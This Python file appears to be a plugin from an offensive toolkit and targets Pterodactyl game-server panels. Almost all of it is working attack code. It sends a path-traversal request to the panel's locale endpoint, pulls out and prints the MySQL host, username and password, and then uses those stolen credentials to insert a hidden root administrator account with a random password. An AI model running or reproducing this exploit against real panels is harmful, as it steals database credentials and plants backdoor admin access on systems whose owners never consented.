import mysql.connector
import bcrypt
import warnings
import urllib3
import requests
import uuid
import string
from requests.exceptions import RequestException
from plugins.common import *

def exploit(target_url):
    # disable warnings
    warnings.filterwarnings("ignore", category=UserWarning)
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # prepare endpoint
    target_url = target_url.strip().rstrip('/') + '/'
    endpoint = f"{target_url}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"

    print(f"\n{gray}[{yellow}#{gray}] {white}Checking {yellow}{target_url}{white} for vuln...\n")

    try:
        # request endpoint
        response = requests.get(endpoint, allow_redirects=True, timeout=5, verify=False)

        # check if vulnerable
        if response.status_code == 200 and "pterodactyl" in response.text.lower():
            try:
                raw_data = response.json()
                data = raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"]

                print(f"{gray}[{yellow}#{gray}] {green}Host is vulnerable!")
                print(f"{gray}• {yellow}Host:     {white}{data['host']}")
                print(f"{gray}• {yellow}Port:     {white}{data['port']}")
                print(f"{gray}• {yellow}Database: {white}{data['database']}")
                print(f"{gray}• {yellow}Username: {white}{data['username']}")
                print(f"{gray}• {yellow}Password: {white}{data['password']}\n")

                return data
            except (KeyError, TypeError):
                print(f"{gray}[{yellow}#{gray}] {white}Vulnerable, but database info is unavailable\n")
                return None
        else:
            print(f"{gray}[{yellow}#{gray}] {white}Not vulnerable or data not found\n")
            return None

    except RequestException as e:
        if "NameResolutionError" in str(e):
            print(f"{gray}[{yellow}#{gray}] {white}Invalid target or unable to resolve domain\n")
        else:
            print(f"{gray}[{yellow}#{gray}] {white}Request error: {e}\n")
        return None

def ptero(target_url):
    # ensure url starts with http/https
    if not (target_url.startswith('http://') or target_url.startswith('https://')):
        target_url = 'https://' + target_url

    # attempt to exploit and get db credentials
    data = exploit(target_url)
    if not data:
        return

    print(f"{gray}[{yellow}#{gray}] {white}Attempting to create admin account...\n")

    # prepare info
    email = "banana@us.gov"
    username = "banana"
    first_name = "Banana"
    last_name = "Republic"
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    uuid_str = str(uuid.uuid4())
    host_clean = str(target_url).replace('https://', '').replace('http://', '').replace('/', '')

    # connect to database
    try:
        conn = mysql.connector.connect(
            host=host_clean,
            port=int(data['port']),
            user=data['username'],
            password=data['password'],
            database=data['database']
        )
    except mysql.connector.Error as err:
        print(f"{gray}[{yellow}#{gray}] {red}Connection error:{white} {err}\n")
        return

    cursor = conn.cursor()

    # hash password with bcrypt
    hashed_pw = bcrypt.hashpw(password.encode(), bcrypt.gensalt(10)).decode()

    # sql insert for admin account
    sql = """
    INSERT INTO users (
        external_id, uuid, username, email, name_first, name_last, password,
        remember_token, language, root_admin, use_totp, totp_secret, totp_authenticated_at,
        gravatar, created_at, updated_at
    ) VALUES (
        NULL, %s, %s, %s, %s, %s, %s,
        %s, 'en', 1, 0, NULL, NULL,
        1, NOW(), NOW()
    )
    """

    try:
        remember_token = ''.join(random.choices(string.ascii_letters + string.digits, k=64))

        # execute insertion
        cursor.execute(sql, (
            uuid_str,
            username,
            email,
            first_name,
            last_name,
            hashed_pw,
            remember_token
        ))
        conn.commit()

        print(f"{gray}[{yellow}#{gray}] {green}Admin Created\n")
        print(f"{gray}• {yellow}Panel:    {white}{target_url}")
        print(f"{gray}• {yellow}Username: {white}{username}")
        print(f"{gray}• {yellow}Email:    {white}{email}")
        print(f"{gray}• {yellow}Password: {white}{password}\n")

    except mysql.connector.Error as err:
        print(f"{gray}[{yellow}#{gray}] {red}Failed to add admin user:{white} {err}\n")
    finally:
        cursor.close()
        conn.close()
